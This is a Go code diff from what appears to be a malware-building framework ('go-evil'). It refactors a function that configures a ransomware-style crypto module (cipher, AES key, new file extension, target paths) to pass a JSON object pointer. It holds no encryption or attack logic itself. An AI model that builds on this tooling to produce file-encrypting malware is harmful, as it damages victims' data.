@@ -6,11 +6,11 @@ import (
 	"github.com/TeamPhoneix/go-evil/domains/crypto/configuration"
 	evil_target "github.com/TeamPhoneix/go-evil/domains/crypto/target"
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-func preface_configuration(value string, s_json string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func preface_configuration(value string, data_object *json.Json_t) []string {
 	call_history := []string{}
 
 	arr := structure.Create_evil_object(value)
@@ -27,31 +27,30 @@ func preface_configuration(value string, s_json string) ([]string, string) {
 		// Set the crypto
 		call := []string{}
 
-		call, s_json = configuration.Set_crypto(crypto_system, s_json)
+		call = configuration.Set_crypto(crypto_system, data_object)
 		call_history = append(call_history, call...)
 
 		// Key handling
 		if key != "" { // We got a key to use
-			call, s_json = configuration.Set_aes_key(key, s_json)
+			call = configuration.Set_aes_key(key, data_object)
 			call_history = append(call_history, call...)
 		}
 
 		// Set extension
-		call, s_json = configuration.Set_extension(new_extension, s_json)
+		call = configuration.Set_extension(new_extension, data_object)
 		call_history = append(call_history, call...)
 
 		// Set targets
 		for _, target := range targets {
 			if target != "" {
-				call, s_json = evil_target.Add(target, s_json)
+				call = evil_target.Add(target, data_object)
 				call_history = append(call_history, call...)
 			}
 
 		}
 
-		data_object = structure.Receive(s_json) // Update our structure
 	}
 
-	return call_history, structure.Send(data_object)
+	return call_history
 
 }
